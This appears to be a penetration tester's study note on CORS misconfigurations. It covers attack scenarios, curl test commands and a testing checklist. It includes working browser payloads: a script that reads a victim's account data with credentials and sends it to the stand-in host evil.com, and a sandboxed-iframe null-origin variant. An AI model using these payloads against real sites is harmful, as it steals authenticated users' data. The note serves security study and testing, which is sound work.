---
tags: [bac, theory, cors, misconfiguration]
type: theory
severity: high
owasp_ref: "A01:2021"
date: 2026-03-10
---

# 🌐 CORS Misconfiguration — Access Control via Origin

## What CORS Has to Do With BAC
CORS misconfigurations allow **attacker-controlled origins** to make credentialed cross-origin requests. When combined with session cookies, this = **authenticated data theft** from the victim's account.

---

## 🔴 Attack Scenarios

### 1. Wildcard with Credentials (Impossible but Attempted)
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
← Browsers reject this combination, but devs try it
```

### 2. Reflected Origin (Most Common)
```http
Request:
  Origin: https://evil.com

Response:
  Access-Control-Allow-Origin: https://evil.com   ← REFLECTED!
  Access-Control-Allow-Credentials: true
```
```html
<!-- Attacker's page at evil.com -->
<script>
fetch("https://target.com/api/user/me", {credentials:"include"})
  .then(r=>r.json())
  .then(d=>fetch("https://evil.com/log?data="+JSON.stringify(d)))
</script>
```

### 3. Null Origin Bypass
```http
Request:
  Origin: null
Response:
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
```
```html
<!-- Trigger null origin via sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    fetch('https://target.com/api/data',{credentials:'include'})
    .then(r=>r.text()).then(d=>top.postMessage(d,'*'))
  </script>">
</iframe>
```

### 4. Subdomain Takeover + CORS
```
CORS policy: *.target.com is trusted
If old-sub.target.com CNAME → expired provider → TAKEOVER
→ Control old-sub.target.com
→ Make cross-origin requests to api.target.com
→ Get credentialed responses
```

### 5. Prefix/Suffix Trust Bypass
```
Policy trusts: target.com
Test:
  Origin: https://target.com.evil.com     → check if trusted
  Origin: https://evil-target.com         → check if trusted  
  Origin: https://notreallytarget.com     → check if trusted
```

---

## 🔧 Testing Steps
```bash
# Step 1: Send request with arbitrary Origin
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=YOUR_TOKEN" \
     -v https://target.com/api/me

# Step 2: Check response headers
# Look for: Access-Control-Allow-Origin: https://evil.com
# Look for: Access-Control-Allow-Credentials: true

# Step 3: Test null origin
curl -H "Origin: null" -H "Cookie: ..." -v https://target.com/api/me

# Step 4: Test subdomain variations
for sub in test dev staging old api-old internal; do
  echo -n "$sub: "
  curl -s -H "Origin: https://$sub.target.com" \
       -H "Cookie: ..." -I https://target.com/api/me \
       | grep "Access-Control"
done
```

---

## Tasks
- [ ] #task Check CORS headers on all API endpoints (especially /api/me, /api/account)
- [ ] #task Test reflected origin attack with credentials
- [ ] #task Test null origin
- [ ] #task Enumerate subdomains and check takeover candidates
- [ ] #task Test partial-match origin bypass (prefix/suffix)

---

## 🔗 Related Notes
- [[API-BAC]]
- [[Testing-Checklist]]

---
*Tags: #cors #bac #theory #misconfiguration*
